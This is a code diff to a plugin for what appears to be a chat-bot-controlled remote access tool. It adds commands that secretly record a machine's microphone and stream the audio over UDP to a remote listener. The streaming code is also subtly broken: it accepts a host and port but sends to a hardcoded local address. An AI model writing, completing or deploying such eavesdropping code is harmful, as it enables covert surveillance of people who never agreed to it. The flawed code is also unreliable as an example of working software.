@@ -5,6 +5,7 @@ from threading import Thread
 import os
 import pyaudio
 import wave
+import socket
 
 class Main(Plugin):
 
@@ -12,19 +13,80 @@ class Main(Plugin):
     version = '1.0.0'
     
     def setup(self):
+        self.stop = False
+        self.frames = []
+
+        c = Command('/mic_record', usage='HOSTNAME /mic_record <seconds> - record <seconds> seconds of audio from microphone')
+        self.add_command(c)
         
-        c = Command('/record_mic', usage='HOSTNAME /record_mic <seconds> - record <seconds> seconds of audio from microphone')
+        c = Command('/mic_stream', usage='HOSTNAME /mic_stream <host> <port> - stream microphone to remote host')
+        self.add_command(c)
+
+        c = Command('/mic_stream_stop', usage='HOSTNAME /mic_stream_stop - stop microphone streaming')
         self.add_command(c)
 
     def handle(self, command, chat_id, *args, **kwargs):
-        if command == '/record_mic':
+        if command == '/mic_record':
             arg_list = [chat_id]
             arg_list += args
 
-            t = Thread(target=self.handle_record_mic, args=tuple(arg_list))
+            t = Thread(target=self.handle_mic_record, args=tuple(arg_list))
+            t.start()
+        elif command == '/mic_stream':
+            arg_list = [chat_id]
+            arg_list += args
+
+            t = Thread(target=self.handle_mic_stream, args=tuple(arg_list))
+            t.start()
+        elif command == '/mic_stream_stop':
+            arg_list = [chat_id]
+            arg_list += args
+
+            t = Thread(target=self.handle_mic_stream_stop)
             t.start()
 
-    def handle_record_mic(self, chat_id, seconds):
+    def handle_mic_stream_stop(self):
+        self.stop = True
+
+    def udpStream(self):
+        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+        while not self.stop:
+            if len(self.frames) > 0:
+                udp.sendto(self.frames.pop(0), ("127.0.0.1", 12345))
+
+        udp.close()
+
+    def record(self, stream, CHUNK):
+        while not self.stop:
+            self.frames.append(stream.read(CHUNK))
+
+    def handle_mic_stream(self, chat_id, host, port):
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 2
+        RATE = 44100
+        CHUNK = 1024
+
+        self.stop = False
+
+        try:
+            audio = pyaudio.PyAudio()
+            stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+
+            self.bot.send_message(chat_id, 'Microphone Streaming started, sending data to server {}:{}'.format(host, port))
+
+            Tr = Thread(target=self.record, args=(stream, CHUNK,))
+            Ts = Thread(target=self.udpStream)
+            Tr.setDaemon(True)
+            Ts.setDaemon(True)
+            Tr.start()
+            Ts.start()
+
+            return
+        except Exception as e:
+            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
+
+    def handle_mic_record(self, chat_id, seconds):
         FORMAT = pyaudio.paInt16
         CHANNELS = 2
         RATE = 44100
